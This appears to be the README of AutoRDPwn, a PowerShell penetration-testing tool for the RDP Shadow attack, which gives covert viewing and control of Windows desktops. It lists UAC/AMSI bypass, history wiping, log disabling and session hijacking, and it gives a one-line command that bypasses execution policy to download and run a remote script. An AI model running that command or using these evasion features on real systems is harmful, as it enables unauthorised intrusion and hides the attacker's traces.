
![AutoRDPwn](https://user-images.githubusercontent.com/34335312/45109339-8b203580-b13f-11e8-9de7-1210114313bb.png)



**AutoRDPwn** es un script creado en Powershell y diseñado para automatizar el ataque **Shadow** en equipos Microsoft Windows. Esta vulnerabilidad permite a un atacante remoto visualizar el escritorio de su víctima sin su consentimiento, e incluso controlarlo a petición. Para su correcto funcionamiento, es necesario cumplir los requisitos que se describen en la guía de uso.


# Requisitos
Powershell 5.0 o superior


# Cambios

## Versión 4.5
• Nuevo icono estilo ninja!

• Limpieza automática del historial de Powershell tras la ejecución

• Ahora todas las dependencias se descargan del mismo repositorio

• Muchos errores y bugs corregidos

• Bypass de UAC & AMSI en sistemas de 64 bits

• Nuevo módulo disponible: Remote Desktop Caching

• Nuevo módulo disponible: Desactivar logs del sistema (Invoke-Phant0m)

• Nuevo ataque disponible: Session Hijacking (sin contraseña)

**ATENCIÓN!** Este ataque es muy intrusivo y solo puede utilizarse localmente

*El resto de cambios se pueden consultar en el fichero CHANGELOG


# Uso
**Ejecución en una línea:**

powershell -ep bypass "cd $env:temp ; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1"

**La guía detallada de uso se encuentra en el siguiente enlace:**

https://darkbyte.net/autordpwn-la-guia-definitiva


# Licencia
Este proyecto está licenciando bajo la licencia GNU 3.0 - ver el fichero LICENSE para más detalles.


# Créditos y Agradecimientos
• **Mark Russinovich** por su herramienta PsExec -> https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

• **Stas'M Corp.** por su herramienta RDP Wrapper -> https://github.com/stascorp/rdpwrap

• **Kevin Robertson** por su script Invoke-TheHash -> https://github.com/Kevin-Robertson/Invoke-TheHash

• **Benjamin Delpy** por su herramienta Mimikatz -> https://github.com/gentilkiwi/mimikatz

• **Halil Dalabasmaz** por su script Invoke-Phant0m -> https://github.com/hlldz/Invoke-Phant0m

# Contacto
Este software no ofrece ningún tipo de garantía. Su uso es exclusivo para entornos educativos y/o auditorías de seguridad con el correspondiente consentimiento del cliente. No me hago responsable de su mal uso ni de los posibles daños causados por el mismo.

Para más información, puede contactar a través de info@darkbyte.net

-------------------------------------------------------------------------------------------------------------
# English description

**AutoRDPwn** is a script created in Powershell and designed to automate the **Shadow** attack on Microsoft Windows computers. This vulnerability allows a remote attacker to view his victim's desktop without his consent, and even control it on request. For its correct operation, it is necessary to comply with the requirements described in the user guide.

# Requirements
Powershell 5.0 or higher

# Changes
## Version 4.5
• New ninja style icon!

• Automatic cleaning of Powershell history after execution

• Now all dependencies are downloaded from the same repository

• Many errors and bugs corrected

• UAC & AMSI Bypass on 64 bits sistems

• New module available: Remote Desktop Caching

• New module available: Disable system logs (Invoke-Phant0m)

• New available attack: Session Hijacking (passwordless)

**WARNING!** This attack is very intrusive and can only be used locally

*The rest of the changes can be consulted in the CHANGELOG file

# Use
**One line execution:**

powershell -ep bypass "cd $env:temp ; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1"

**The detailed guide of use can be found at the following link:**

https://darkbyte.net/autordpwn-la-guia-definitiva

# License
This project is licensed under the GNU 3.0 license - see the LICENSE file for more details.

# Credits and Acknowledgments
• **Mark Russinovich** for his tool PsExec -> https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

• **Stas'M Corp.** for its RDP tool Wrapper -> https://github.com/stascorp/rdpwrap

• **Kevin Robertson** for his script Invoke-TheHash -> https://github.com/Kevin-Robertson/Invoke-TheHash

• **Benjamin Delpy** for his tool Mimikatz -> https://github.com/gentilkiwi/mimikatz

• **Halil Dalabasmaz** for his script Invoke-Phant0m -> https://github.com/hlldz/Invoke-Phant0m

# Contact
This software does not offer any kind of guarantee. Its use is exclusive for educational environments and / or security audits with the corresponding consent of the client. I am not responsible for its misuse or for any possible damage caused by it.

For more information, you can contact through info@darkbyte.net
